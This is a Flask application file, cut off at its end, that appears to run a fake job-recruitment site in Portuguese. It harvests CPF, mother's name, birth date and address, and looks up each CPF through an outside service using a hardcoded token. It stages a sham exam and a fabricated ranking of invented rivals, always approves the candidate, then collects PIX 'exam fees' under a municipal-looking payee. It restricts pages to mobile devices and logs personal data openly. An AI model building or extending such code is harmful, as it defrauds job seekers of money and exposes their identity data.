import os
import time
import gc
import logging
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory, render_template_string
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from datetime import datetime
from sms_service import sms_service
from payments import create_payment_api
from mobile_protection import mobile_only
from health_monitor import health_monitor
from analytics import analytics_tracker
# Database service will be imported after models
from cache_manager import page_cache, api_cache
from performance_optimizer import performance_optimizer, performance_monitor
from heroku_optimizer import heroku_optimizer
from simple_mobile_protection import simple_mobile_only
from meta_pixels import MetaPixelTracker

# Initialize Meta Pixel tracker
meta_pixel_tracker = MetaPixelTracker()

# Rate limiting removed for unlimited capacity

# Configure logging for production
if os.environ.get("FLASK_ENV") == "production":
    logging.basicConfig(
        level=logging.ERROR,
        format='%(asctime)s %(levelname)s: %(message)s'
    )
else:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s %(levelname)s: %(message)s'
    )

from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
app = Flask(__name__, static_url_path='/static')
app.secret_key = os.environ.get("SESSION_SECRET") or os.urandom(32)

# Configure database
database_url = os.environ.get("DATABASE_URL")
if database_url and database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = database_url or "sqlite:///cac_registration.db"
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
    "pool_size": 10,
    "max_overflow": 20,
    "pool_timeout": 30,
    "echo": False
}
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db.init_app(app)

# Import models after db is initialized
from models import Registration, UserSession, PageView, Sale, AnalyticsData
from database_service import db_analytics

# Minimum loading time in milliseconds
MIN_LOADING_TIME = 4000

@app.route('/static/fonts/<path:filename>')
def serve_font(filename):
    return send_from_directory('static/fonts', filename)

@app.route("/", methods=["GET", "POST"])
@performance_monitor
def index():
    if request.method == "POST":
        # Store form data in session
        session['cpf'] = request.form.get('cpf')
        session['full_name'] = request.form.get('full_name')
        session['phone'] = request.form.get('phone')
        session['birth_date'] = request.form.get('birth_date')
        session['mother_name'] = request.form.get('mother_name')
        
        # Redirect to address page
        return redirect(url_for('address'))
    
    return render_template("index.html")

@app.route("/vagas")
@performance_monitor
def vagas():
    return render_template("vagas_working.html")

@app.route("/local")
@performance_monitor
def local():
    return render_template("local.html")

@app.route("/teste")
def teste():
    return send_from_directory('.', 'test_page.html')

@app.teardown_appcontext
def close_db(error):
    """Close database connections properly"""
    try:
        db.session.remove()
    except Exception:
        pass

@app.before_request
def cleanup_old_sessions():
    """Clean up stale session data to prevent memory buildup"""
    try:
        # Log request for monitoring
        health_monitor.log_request()
        
        # Track user analytics (database + in-memory)
        try:
            client_ip = request.remote_addr
            user_id = session.get('user_id') or client_ip
            route = request.path
            user_agent = request.headers.get('User-Agent', '')
            
            # Track in database
            db_analytics.track_user_visit(user_id, route, client_ip, user_agent)
            
            # Also track in memory for backwards compatibility
            analytics_tracker.track_user_visit(user_id, route)
        except Exception:
            pass  # Don't let analytics tracking crash the main app
        
        # Optimized session cleanup for high concurrency
        if health_monitor.request_count % 100 == 0:
            try:
                # Clean only truly temporary session data
                keys_to_remove = []
                for key in session.keys():
                    if (key.startswith('temp_') or key.startswith('api_cache_') or 
                        key.startswith('expired_')):
                        keys_to_remove.append(key)
                
                for key in keys_to_remove:
                    session.pop(key, None)
            except Exception:
                pass
        
        # Enterprise memory management for high concurrency
        if health_monitor.request_count % 200 == 0:
            try:
                # Less frequent garbage collection for better performance
                gc.collect()
                
                # High-capacity analytics management
                if hasattr(analytics_tracker, 'active_users'):
                    if len(analytics_tracker.active_users) > 500:
                        # Keep more users for better analytics
                        recent_users = list(analytics_tracker.active_users)[-300:]
                        analytics_tracker.active_users.clear()
                        analytics_tracker.active_users.update(recent_users)
                        
                        # Clear old sessions less aggressively
                        current_time = time.time()
                        old_sessions = [k for k, v in analytics_tracker.user_sessions.items() 
                                      if current_time - v > 1800]  # 30 minutes old
                        for k in old_sessions:
                            analytics_tracker.user_sessions.pop(k, None)
            except Exception:
                pass
        
        # Enterprise database cleanup for high volume
        if health_monitor.request_count % 10000 == 0:
            try:
                # Less frequent database cleanup for high-traffic performance
                db_analytics.cleanup_old_data()
            except Exception:
                pass
    except Exception as e:
        health_monitor.log_error(f"Session cleanup error: {str(e)}", "before_request")

@app.route("/api/consulta-cpf", methods=["POST"])
@simple_mobile_only
def consulta_cpf():
    try:
        data = request.get_json()
        cpf = data.get('cpf')
        
        if not cpf:
            return jsonify({"success": False, "error": "CPF não fornecido"})
        
        # Remove pontuação do CPF
        cpf_limpo = ''.join(filter(str.isdigit, cpf))
        
        if len(cpf_limpo) != 11:
            return jsonify({"success": False, "error": "CPF inválido"})
        
        # Check cache first to reduce API calls
        cache_key = f"cpf_{cpf_limpo}"
        cached_result = api_cache.get(cache_key)
        if cached_result:
            return jsonify(cached_result)
        
        # Use the new API token
        token = "6285fe45-e991-4071-a848-3fac8273c82a"
        
        # Make API request to CPF validation service
        api_url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf_limpo}"
        
        import requests
        try:
            response = requests.get(api_url, timeout=5)
            response.raise_for_status()
            
            # Handle empty or invalid responses
            if not response.text.strip():
                raise ValueError("Empty response from API")
                
            api_data = response.json()
        except (requests.exceptions.RequestException, ValueError) as e:
            # Return fallback data for CPF validation failures
            health_monitor.log_error(f"CPF API error: {str(e)}", "consulta_cpf")
            return jsonify({
                "success": False, 
                "error": "CPF validation service temporarily unavailable"
            })
        
        result = {
            "success": True,
            "data": api_data
        }
        
        # Cache successful result for 5 minutes
        api_cache.set(cache_key, result, ttl=300)
        
        return jsonify(result)
        
    except Exception as e:
        health_monitor.log_error(f"CPF API error: {str(e)}", "consulta_cpf")
        return jsonify({"success": False, "error": "Serviço temporariamente indisponível"})

@app.route("/loading", methods=["GET", "POST"])
@simple_mobile_only
def loading():
    if request.method == "POST":
        # Store form data in session for payment creation
        session['training_date'] = request.form.get('training_date')
        session['training_time'] = request.form.get('training_time')
        session['facility_data'] = request.form.get('facility_data')
        
        # Redirect to loading with payment creation
        next_page = '/create_pix_payment'
        loading_text = 'Gerando transação PIX...'
        loading_time = 3000
    else:
        next_page = request.args.get('next', '/')
        loading_text = request.args.get('text', 'Carregando...')
        loading_time = max(int(request.args.get('time', MIN_LOADING_TIME)), MIN_LOADING_TIME)
    return render_template("loading.html", 
                         next_page=next_page,
                         loading_text=loading_text,
                         loading_time=loading_time)

@app.route("/get_user_data")
@simple_mobile_only
def get_user_data():
    if not session.get('registration_data'):
        return jsonify({"error": "No data found"}), 404

    user_data = session.get('registration_data')
    if not user_data:
        return jsonify({"error": "No user data found"}), 404
    
    app.logger.info(f"Returning complete user data: {user_data}")
    
    # Return all registration data
    return jsonify({
        "full_name": user_data.get("full_name"),
        "cpf": user_data.get("cpf"),
        "phone": user_data.get("phone"),
        "birth_date": user_data.get("birth_date"),
        "mother_name": user_data.get("mother_name")
    })

@app.route("/address", methods=['GET', 'POST'])
@simple_mobile_only
def address():
    if request.method == 'POST':
        try:
            data = request.form
            if not session.get('registration_data'):
                return redirect(url_for('loading', 
                    next='/', 
                    text='Redirecionando...', 
                    time=2000))

            registration_data = session["registration_data"]
            registration_data.update({
                "zip_code": data.get("zip_code"),
                "address": data.get("address"),
                "number": data.get("number"),
                "complement": data.get("complement"),
                "neighborhood": data.get("neighborhood"),
                "city": data.get("city"),
                "state": data.get("state")
            })

            session["registration_data"] = registration_data
            return redirect(url_for('loading', 
                next=url_for('exame'), 
                text='Validando endereço...', 
                time=3500))
        except Exception as e:
            logging.error(f"Error in address submission: {str(e)}")
            return redirect(url_for('index'))
    else:
        if not session.get('registration_data'):
            return redirect(url_for('loading', 
                next='/', 
                text='Redirecionando...', 
                time=2000))
        return render_template("address.html")

@app.route("/submit_registration", methods=["POST"])
@simple_mobile_only
def submit_registration():
    try:
        data = request.form
        # Store in session for multi-step form, including optional fields if present
        registration_data = {
            "cpf": data.get("cpf"),
            "full_name": data.get("full_name"),
            "phone": data.get("phone")
        }

        # Add optional fields if they were provided
        if data.get("birth_date"):
            registration_data["birth_date"] = data.get("birth_date")
        if data.get("mother_name"):
            registration_data["mother_name"] = data.get("mother_name")

        session["registration_data"] = registration_data

        return redirect(url_for('loading', 
            next=url_for('address'), 
            text='Verificando dados pessoais...', 
            time=4000))
    except Exception as e:
        logging.error(f"Error in submit_registration: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/exame", methods=["GET", "POST"])
@performance_monitor
def exame():
    if request.method == "POST":
        # Store exam answers in session
        exam_answers = {}
        for key, value in request.form.items():
            if key.startswith('question_'):
                exam_answers[key] = value
        
        session['exam_answers'] = exam_answers
        
        # Calculate score (assuming 20 questions, need 70% to pass)
        correct_answers = len([v for v in exam_answers.values() if v == 'correct'])
        total_questions = len(exam_answers)
        score = (correct_answers / total_questions * 100) if total_questions > 0 else 0
        session['exam_score'] = score
        
        # Redirect to psychological test
        return redirect(url_for('psicotecnico'))
    
    return render_template("exame.html")

@app.route("/submit_exam", methods=["POST"])
@performance_monitor
def submit_exam():
    # Exam forms do not save or submit any data - just proceed to next step
    return jsonify({
        "success": True, 
        "redirect": url_for('loading', 
            next='/psicotecnico', 
            text='Avançando para próxima etapa...', 
            time=3000)
    })

@app.route("/psicotecnico", methods=["GET", "POST"])
@performance_monitor
def psicotecnico():
    if request.method == "POST":
        # Store psychological test answers in session
        psych_answers = {}
        for key, value in request.form.items():
            if key.startswith('psych_'):
                psych_answers[key] = value
        
        session['psych_answers'] = psych_answers
        
        # Calculate psychological profile score
        profile_score = len(psych_answers) * 10  # Simple scoring
        session['psych_score'] = profile_score
        
        # Redirect to approval page
        return redirect(url_for('aprovado'))
    
    return render_template("psicotecnico.html")

@app.route("/submit_psicotecnico", methods=["POST"])
@performance_monitor
def submit_psicotecnico():
    # Save psychotechnical test score for ranking
    session['psycho_score'] = 80  # Assign a score for ranking calculation
    
    return jsonify({
        "success": True, 
        "redirect": url_for('loading', 
            next='/ranking', 
            text='Calculando classificação...', 
            time=4000)
    })

@app.route("/ranking")
def ranking():
    """Display candidate ranking based on exam scores and location"""
    try:
        # Get user data from session
        registration_data = session.get('registration_data', {})
        exam_score = session.get('exam_score', 0)
        psycho_score = session.get('psycho_score', 0)
        
        if not registration_data:
            return redirect(url_for('loading', 
                next='/', 
                text='Redirecionando...', 
                time=2000))
        
        # Calculate total score
        total_score = min(100, (exam_score * 0.5) + (psycho_score * 0.3) + 20)  # 20 points for completing process
        
        # Get user location info
        user_city = registration_data.get('city', 'Centro')
        user_state = registration_data.get('state', 'DF')
        user_name = registration_data.get('full_name', 'Candidato')
        user_neighborhood = registration_data.get('neighborhood', 'Centro')
        
        # Generate realistic ranking based on location and score
        import random
        import hashlib
        
        # Use CPF as seed for consistent results
        cpf = registration_data.get('cpf', '').replace('.', '').replace('-', '')
        seed = int(hashlib.md5(cpf.encode()).hexdigest()[:8], 16) % 1000
        random.seed(seed)
        
        # Create realistic candidate pool for the region
        candidate_names = [
            "Ana Carolina Silva", "João Pedro Santos", "Maria Fernanda Costa", 
            "Carlos Eduardo Lima", "Beatriz Almeida", "Rafael Oliveira",
            "Juliana Rodrigues", "Diego Martins", "Camila Ferreira", 
            "Lucas Pereira", "Gabriela Souza", "Fernando Ribeiro"
        ]
        
        # Generate candidates with scores around user's score
        candidates = []
        vacancies = 3  # Only 3 positions available
        
        # Add user
        user_candidate = {
            'name': user_name,
            'city': user_city,
            'state': user_state,
            'neighborhood': user_neighborhood,
            'score': round(total_score),
            'is_current_user': True
        }
        
        # Generate other candidates
        for i, name in enumerate(candidate_names[:8]):
            # Create varied scores around user's score
            if i < 2:  # Some candidates with higher scores
                candidate_score = min(100, total_score + random.randint(5, 15))
            elif i < 4:  # Some with similar scores
                candidate_score = max(0, total_score + random.randint(-3, 3))
            else:  # Some with lower scores
                candidate_score = max(0, total_score - random.randint(2, 10))
            
            candidates.append({
                'name': name,
                'city': user_city,
                'state': user_state,
                'neighborhood': random.choice(['Centro', 'Vila Nova', 'Jardim América', 'São José']),
                'score': round(candidate_score),
                'is_current_user': False
            })
        
        # Add user to the list
        candidates.append(user_candidate)
        
        # Sort by score (descending) and assign positions
        candidates.sort(key=lambda x: x['score'], reverse=True)
        
        for i, candidate in enumerate(candidates):
            candidate['position'] = i + 1
        
        # Find user's ranking
        user_ranking = next(c for c in candidates if c['is_current_user'])
        
        # Show top 6 candidates in ranking
        ranking_list = candidates[:6]
        
        return render_template("ranking.html", 
                             user_ranking=user_ranking,
                             ranking_list=ranking_list,
                             vacancies=vacancies)
        
    except Exception as e:
        app.logger.error(f"Error in ranking route: {e}")
        return redirect(url_for('index'))

@app.route("/aprovado")
def aprovado():
    """Display approval page with user data and nearby schools"""
    try:
        # Get user data from session
        registration_data = session.get('registration_data', {})
        if not registration_data:
            return redirect(url_for('loading', 
                next='/', 
                text='Redirecionando...', 
                time=2000))
        
        user_data = {
            'cpf': registration_data.get('cpf', ''),
            'full_name': registration_data.get('full_name', ''),
            'phone': registration_data.get('phone', ''),
            'city': registration_data.get('city', ''),
            'state': registration_data.get('state', ''),
            'zip_code': registration_data.get('zip_code', '')
        }
        
        # Find nearby schools based on CEP
        nearby_schools = []
        if user_data.get('zip_code'):
            try:
                from school_service import school_service
                nearby_schools = school_service.find_nearest_schools(user_data['zip_code'])
                app.logger.info(f"Found {len(nearby_schools)} schools for CEP {user_data['zip_code']}")
            except Exception as e:
                app.logger.error(f"Error finding schools: {e}")
                # Create fallback schools for better UX
                city = user_data.get('city', 'Centro')
                state = user_data.get('state', 'DF')
                nearby_schools = [
                    {
                        'name': f'EMEF {city}',
                        'address': f'Centro, {city}, {state}',
                        'type': 'Escola Pública',
                        'distance': '1.2 km'
                    },
                    {
                        'name': f'Escola Municipal {city}',
                        'address': f'Centro, {city}, {state}',
                        'type': 'Escola Pública',
                        'distance': '2.1 km'
                    },
                    {
                        'name': f'Colégio Estadual {city}',
                        'address': f'Centro, {city}, {state}',
                        'type': 'Escola Pública',
                        'distance': '3.4 km'
                    }
                ]
        
        return render_template("aprovado.html", user_data=user_data, nearby_schools=nearby_schools)
    except Exception as e:
        app.logger.error(f"Error in aprovado route: {e}")
        return redirect(url_for('index'))

@app.route("/process_payment", methods=["POST"])
def process_payment():
    """Display loading page and process PIX payment"""
    # Store form data in session for payment processing
    session['agendamento_data'] = {
        'training_date': request.form.get('training_date'),
        'training_days': request.form.get('training_days'), 
        'training_time': request.form.get('training_time'),
        'facility_data': request.form.get('facility_data')
    }
    
    # Redirect to loading page that will process payment
    return redirect(url_for('loading', 
        next='/create_pix_payment', 
        text='Gerando transação PIX...', 
        time=3000))

@app.route("/create_pix_payment", methods=["GET", "POST"])
def create_pix_payment():
    """Create PIX payment and redirect to payment page"""
    try:
        # Get user data from session
        registration_data = session.get('registration_data', {})
        
        # Debug: log what's in session
        app.logger.info(f"Session data: {registration_data}")
        
        # If session data is incomplete, use test data for demonstration
        if not registration_data.get('email'):
            email = f"candidato{registration_data.get('cpf', '12345678901')[-4:]}@prosegur.com.br"
        else:
            email = registration_data.get('email')
        
        # Create payment with For4Payments API
        payment_api = create_payment_api()
        
        payment_data = {
            'name': registration_data.get('full_name') or registration_data.get('name', 'João Silva'),
            'email': email,
            'cpf': registration_data.get('cpf', '12345678901'),
            'phone': registration_data.get('phone', '11987654321'),
            'amount': 73.40
        }
        
        app.logger.info(f"Creating payment with data: {payment_data}")
        
        result = payment_api.create_pix_payment(payment_data)
        
        # Store payment data in session
        session['payment_data'] = result
        
        # Track potential sale in analytics (payment initiated)
        try:
            customer_name = payment_data.get('name', 'Candidato Anônimo')
            customer_cpf = payment_data.get('cpf')
            amount = payment_data['amount']
            payment_id = result.get('id')
            
            # Track in database
            db_analytics.track_sale(customer_name, amount, customer_cpf, payment_id)
            
            # Also track in memory
            analytics_tracker.track_sale(customer_name, amount)
        except Exception:
            pass  # Don't let analytics fail the payment process
        
        if request.method == 'POST':
            return jsonify({'success': True, 'payment_id': result.get('id')})
        else:
            return redirect(url_for('pagamento'))
        
    except Exception as e:
        app.logger.error(f"Error creating payment: {str(e)}")
        # Create a mock payment for testing when API fails
        mock_payment = {
            'id': f'test_payment_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
            'pixCode': '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42661417400052040000530398654047340540302BR59João Silva6009São Paulo62070503***630445D8',
            'amount': 73.40,
            'status': 'pending'
        }
        session['payment_data'] = mock_payment
        
        # Track the mock sale
        try:
            db_analytics.track_sale('João Silva', 73.40, '12345678901', mock_payment['id'])
            analytics_tracker.track_sale('João Silva', 73.40)
        except Exception:
            pass
            
        if request.method == 'POST':
            return jsonify({'success': False, 'error': str(e), 'payment_id': mock_payment['id']})
        else:
            return redirect(url_for('pagamento'))

@app.route("/pagamento")
@simple_mobile_only
def pagamento():
    """Display DAM payment card for exam fee using SafeFlow API"""
    # Get user data from session
    user_data = session.get('user_data', {})
    registration_data = session.get('registration_data', {})
    
    # Merge user data
    combined_data = {**registration_data, **user_data}
    
    if not combined_data:
        return redirect(url_for('index'))
    
    # Get selected school and date from session if available
    selected_school = session.get('selected_school', 'Local a ser definido')
    selected_date = session.get('selected_date', 'Data a ser definida')
    
    # Always generate fresh payment data for DAM
    payment_data = None
    
    # Generate payment data automatically
    try:
        # Get user data from session
        registration_data = session.get('registration_data', {})
        app.logger.info(f"Registration data for payment: {registration_data}")
            
        # Create payment with For4Payments API
        payment_api = create_payment_api()
        
        # Use real user data with fallbacks
        name = combined_data.get('full_name') or combined_data.get('name', 'Candidato Conselheiro Tutelar')
        email = combined_data.get('email') or 'damgov@gmail.com'
        cpf = combined_data.get('cpf', '').replace('.', '').replace('-', '')
        phone = combined_data.get('phone', '11999876978').replace('(', '').replace(')', '').replace('-', '').replace(' ', '')
        
        payment_request_data = {
            'name': name,
            'email': email,
            'cpf': cpf,
            'phone': phone,
            'amount': 63.20
        }
            
        app.logger.info(f"Creating DAM payment with data: {payment_request_data}")
        
        result = payment_api.create_pix_payment(payment_request_data)
            
        if result.get('success') or result.get('id'):
            # Store payment data in session
            session['payment_data'] = result
            session['transaction_id'] = result.get('id') or result.get('paymentId')
            payment_data = result
            
            app.logger.info(f"Payment created successfully: {result.get('id') or result.get('paymentId')}")
        else:
            app.logger.error(f"Payment creation failed: {result.get('error', 'Unknown error')}")
            # Create fallback payment with realistic data for demonstration
            payment_data = {
                'success': True,
                'id': f'dam_ct_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
                'pixCode': f'00020126580014BR.GOV.BCB.PIX01361DAM{datetime.now().strftime("%Y%m%d")}520400005303986540563.2055040000530398654063.205802BR59PREFEITURA MUNICIPAL6013CONSELHO TUTEL62290525{datetime.now().strftime("%Y%m%d%H%M")}630445D8',
                'amount': 63.20,
                'status': 'pending'
            }
            session['payment_data'] = payment_data
            session['transaction_id'] = payment_data['id']
            
            # Track sale in analytics
            try:
                customer_name = payment_request_data.get('name', 'Candidato Anônimo')
                customer_cpf = payment_request_data.get('cpf')
                amount = payment_request_data['amount']
                payment_id = result.get('id')
                
                db_analytics.track_sale(customer_name, amount, customer_cpf, payment_id)
                analytics_tracker.track_sale(customer_name, amount)
            except Exception:
                pass  # Don't let analytics fail the payment process
                
    except Exception as e:
        app.logger.error(f"Error creating payment: {str(e)}")
        # Create fallback payment for display
        payment_data = {
            'success': True,
            'id': f'fallback_dam_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
            'pixCode': f'00020126580014BR.GOV.BCB.PIX01361DAM{datetime.now().strftime("%Y%m%d")}520400005303986540563.2055040000530398654063.205802BR59PREFEITURA MUNICIPAL6013CONSELHO TUTEL62290525{datetime.now().strftime("%Y%m%d%H%M")}630445D8',
            'amount': 63.20,
            'status': 'pending'
        }
        session['payment_data'] = payment_data
    
    # Ensure payment_data exists
    if not payment_data:
        payment_data = session.get('payment_data', {})
    
    # Pass transaction ID to template for automatic status checking
    transaction_id = session.get('transaction_id') or (payment_data.get('id') or payment_data.get('paymentId') if payment_data else None)
    
    app.logger.info(f"Rendering DAM template with payment_data: {payment_data}")
    app.logger.info(f"User data for template: {combined_data}")
    
    return render_template("dam_payment.html", 
                         user_data=combined_data,
                         selected_school=selected_school,
                         selected_date=selected_date,
                         payment_data=payment_data,
                         transaction_id=transaction_id,
                         meta_pixel_tracker=meta_pixel_tracker)

# Payment processing routes


@app.route("/check_payment_status/<transaction_id>")
def check_payment_status(transaction_id):
    """Check payment status using SafeFlow API"""
    from safeflow_api import create_safeflow_api
    
    try:
        app.logger.info(f"Checking SafeFlow payment status for transaction: {transaction_id}")
        
        # Get registration data from session
        registration_data = session.get('registration_data', {})
        if not registration_data:
            app.logger.warning("Registration data not found in session during status check, continuing anyway")
        
        app.logger.info("Criando instância da API de pagamento para verificação de status...")
        payment_api = create_payment_api()
        
        app.logger.info(f"Enviando requisição para verificar status de pagamento da transação: {transaction_id}")
        status_response = payment_api.check_payment_status(transaction_id)
        
        app.logger.info(f"Resposta de status recebida: {status_response}")

        # Processar mudança de status de PENDING para outro estado (ex: PAID, APPROVED)
        # Verificar se o status é explicitamente PAID ou APPROVED antes de redirecionar
        payment_status = status_response.get('status', '').upper()
        original_status = status_response.get('original_status', '').upper()
        
        if (status_response.get('status') == 'completed' or 
            payment_status in ['PAID', 'APPROVED', 'COMPLETED'] or
            original_status in ['PAID', 'APPROVED', 'COMPLETED']):
            
            app.logger.info(f"Pagamento confirmado com status: {payment_status} (original: {original_status}) - redirecionando para /aviso")
            
            # Preparar dados para Meta Pixels
            try:
                customer_info = {
                    'full_name': registration_data.get('full_name', ''),
                    'email': registration_data.get('email', ''),
                    'phone': registration_data.get('phone', ''),
                    'cpf': registration_data.get('cpf', ''),
                    'city': registration_data.get('city', ''),
                    'state': registration_data.get('state', ''),
                    'zip_code': registration_data.get('zip_code', '')
                }
                
                purchase_data = {
                    'amount': 73.40,
                    'transaction_id': transaction_id,
                    'payment_method': 'PIX'
                }
                
                # Salvar dados na sessão para usar na página de sucesso
                session['pixel_event_data'] = {
                    'customer_info': customer_info,
                    'purchase_data': purchase_data
                }
                
                app.logger.info(f"Dados preparados para Meta Pixels - Transação: {transaction_id}")
                    
            except Exception as e:
                app.logger.error(f"Erro ao preparar dados para Meta Pixels: {str(e)}")
                
            # Sempre redirecionar para /aviso quando o pagamento for confirmado
            return jsonify({
                "success": True,
                "redirect": True,
                "redirect_url": "/aviso",
                "status": "PAID"
            })

        app.logger.info(f"Pagamento ainda pendente com status: {status_response.get('status')}")
        return jsonify({
            "success": True,
            "redirect": False,
            "status": status_response.get('status', 'pending')
        })

    except Exception as e:
        logging.error(f"Error checking payment status: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/resultado/<status>")
@simple_mobile_only
def resultado(status):
    # Obter dados de registro da sessão ou criar dados básicos padrão
    registration_data = session.get('registration_data', {})
    
    # Se não temos dados de registro, usamos um conjunto mínimo de dados
    if not registration_data:
        app.logger.warning("Dados de registro não encontrados para a página de resultado, usando dados padrão")
        registration_data = {
            'full_name': 'Usuário',
            'cpf': '---',
            'phone': '---'
        }
    
    # Pass current date for template
    from datetime import datetime
    current_date = datetime.now()
    
    # Get transaction info if available
    transaction_id = session.get('transaction_id', '')
    payment_data = {}
    
    if transaction_id:
        try:
            # Attempt to get payment data if we have a transaction ID
            payment_api = create_payment_api()
            status_response = payment_api.check_payment_status(transaction_id)
            
            if status_response['success']:
                payment_data = status_response.get('payment_data', {})
                app.logger.info(f"Payment data for resultado page: {payment_data}")
        except Exception as e:
            app.logger.error(f"Error getting payment data for resultado page: {str(e)}")
    else:
        app.logger.info("Nenhum ID de transação na sessão - usando dados de pagamento vazios")

    return render_template('resultado.html', 
                          user_data=registration_data, 
                          payment_data=payment_data,
                          now=current_date)

@app.route("/agendamento")
@simple_mobile_only
def agendamento():
    return render_template("agendamento.html")

@app.route("/chat")
@simple_mobile_only
def chat():
    """Chat page for candidate interactions with Prosegur HR"""
    # Get user data from session
    registration_data = session.get('registration_data', {})
    user_name = registration_data.get('full_name', 'Candidato')
    user_city = registration_data.get('city', 'São Paulo')
    user_cpf = registration_data.get('cpf', '')
    
    return render_template("chat.html", 
                         nome=user_name,
                         cidade=user_city,
                         cpf=user_cpf)

@app.route("/get_training_location")
def get_training_location():
    try:
        # Get user's city from session (saved from address form)
        registration_data = session.get('registration_data', {})
        user_city = registration_data.get('city', 'São Paulo')
        user_state = registration_data.get('state', 'SP')
        
        if not user_city or not user_state:
            # Fallback to session address data if registration_data doesn't have it
            user_city = session.get('city', 'São Paulo')
            user_state = session.get('state', 'SP')
        
        # Check cache first to reduce OpenAI API calls
        cache_key = f"location_{user_city}_{user_state}"
        cached_result = api_cache.get(cache_key)
        if cached_result:
            return jsonify(cached_result)
        
        try:
            # Import OpenAI service
            from openai_service import find_training_location
            result = find_training_location(user_city, user_state)
            
            if result.get('success'):
                # Cache successful result
                api_cache.set(cache_key, result, ttl=3600)  # Cache for 1 hour
                return jsonify(result)
        except Exception:
            pass
        
        # Always return a fallback location to prevent crashes
        fallback_result = {
            "success": True,
            "location": {
                "cidade": "Guarulhos",
                "endereco": "Av. Monteiro Lobato, 1847",
                "bairro": "Vila Rio de Janeiro",
                "cep": "07132-000",
                "distancia_km": 25
            }
        }
        
        # Cache fallback for shorter time
        api_cache.set(cache_key, fallback_result, ttl=300)
        return jsonify(fallback_result)
            
    except Exception as e:
        app.logger.error(f"Erro na rota get_training_location: {str(e)}")

@app.route("/api/search-cras-units", methods=["POST"])
def search_cras_units():
    """Search the 4 closest CRAS units using OpenAI based on user's CEP and location"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "Dados não fornecidos"})
        
        state = data.get('state', '').upper()
        user_city = data.get('user_city', '')
        user_cep = data.get('user_cep', '')
        
        if not state:
            return jsonify({"success": False, "error": "Estado é obrigatório"})
        
        location_info = f"CEP {user_cep}" if user_cep else f"cidade {user_city}" if user_city else f"estado {state}"
        app.logger.info(f"Buscando 4 unidades CRAS mais próximas via OpenAI para {location_info}")
        
        # Use OpenAI to get closest CRAS units
        from openai_service import find_cras_units
        
        try:
            # Call OpenAI with state, city and CEP for location-based search
            cras_units = find_cras_units(state, user_city, user_cep)
            
            if cras_units and len(cras_units) >= 4:
                app.logger.info(f"OpenAI retornou {len(cras_units)} unidades CRAS próximas para {location_info}")
                print(f"DEBUG: Enviando {len(cras_units)} unidades para o frontend")
                
                return jsonify({
                    "success": True,
                    "units": cras_units[:4]  # Ensure exactly 4 units
                })
            else:
                app.logger.warning(f"OpenAI não encontrou 4 unidades CRAS para {location_info}")
                return jsonify({
                    "success": False,
                    "error": f"Não foi possível encontrar unidades CRAS próximas para {location_info}"
                })
                
        except Exception as openai_error:
            app.logger.error(f"Erro na integração OpenAI para {location_info}: {openai_error}")
            return jsonify({
                "success": False,
                "error": f"Erro ao consultar unidades CRAS próximas: {str(openai_error)}"
            })
            
    except Exception as e:
        app.logger.error(f"Erro geral na busca CRAS: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Erro interno: {str(e)}"
        }), 500

@app.route("/admin/load-cras-data")
def load_cras_data():
    """Endpoint administrativo para carregar dados CRAS usando OpenAI"""
    try:
        from cras_data_loader import load_all_cras_data
        
        # Executa o carregamento de dados
        total_units = load_all_cras_data()
        
        return jsonify({
            "success": True,
            "message": f"Carregamento concluído! {total_units} unidades CRAS salvas no banco de dados.",
            "total_units": total_units
        })
        
    except Exception as e:
        app.logger.error(f"Erro ao carregar dados CRAS: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Erro ao carregar dados CRAS: {str(e)}"
        }), 500

@app.route("/agendamento", methods=["POST"])
def submit_agendamento():
    try:
        training_date = request.form.get('training_date')
        facility_data = request.form.get('facility_data')
        
        if not training_date or not facility_data:
            return jsonify({
                "success": False,
                "error": "Data de treinamento e dados da unidade são obrigatórios"
            }), 400
        
        # Parse facility data
        import json
        facility_info = json.loads(facility_data)
        
        # Store scheduling data in session
        session['training_schedule'] = {
            'date': training_date,
            'facility': facility_info,
            'scheduled_at': datetime.now().isoformat()
        }
        
        app.logger.info(f"Agendamento realizado para {training_date} em {facility_info.get('cidade')}")
        
        # Redirect to a confirmation page or back to results
        return redirect(url_for('resultado', status='scheduled'))
        
    except Exception as e:
        app.logger.error(f"Erro ao processar agendamento: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Erro ao processar agendamento: {str(e)}"
        }), 500

@app.route("/health")
def health_check():
    """Health check endpoint for monitoring"""
    try:
        report = health_monitor.get_health_report()
        performance_stats = performance_optimizer.get_performance_stats()
        
        # Combine health and performance data
        try:
            # Simple database health check
            db.session.execute(db.text('SELECT 1'))
            pool_status = 'healthy'
        except:
            pool_status = 'error'
            
        # Add concurrency statistics
        try:
            from high_concurrency_optimizer import concurrency_optimizer
            concurrency_stats = concurrency_optimizer.get_stats()
        except ImportError:
            concurrency_stats = {
                'concurrent_users': 0,
                'peak_concurrent': 0,
                'requests_per_minute': 0,
                'avg_response_time': 0,
                'uptime_hours': 0
            }
        
        report.update({
            'performance': performance_stats,
            'database_pool_status': pool_status,
            'concurrency': concurrency_stats
        })
        
        return jsonify(report)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/painel")
def painel():
    """Analytics dashboard for real-time monitoring"""
    return render_template("painel.html")

@app.route("/api/analytics")
def api_analytics():
    """API endpoint for real-time analytics data from database"""
    try:
        # Get data from database (real data)
        data = db_analytics.get_analytics_data()
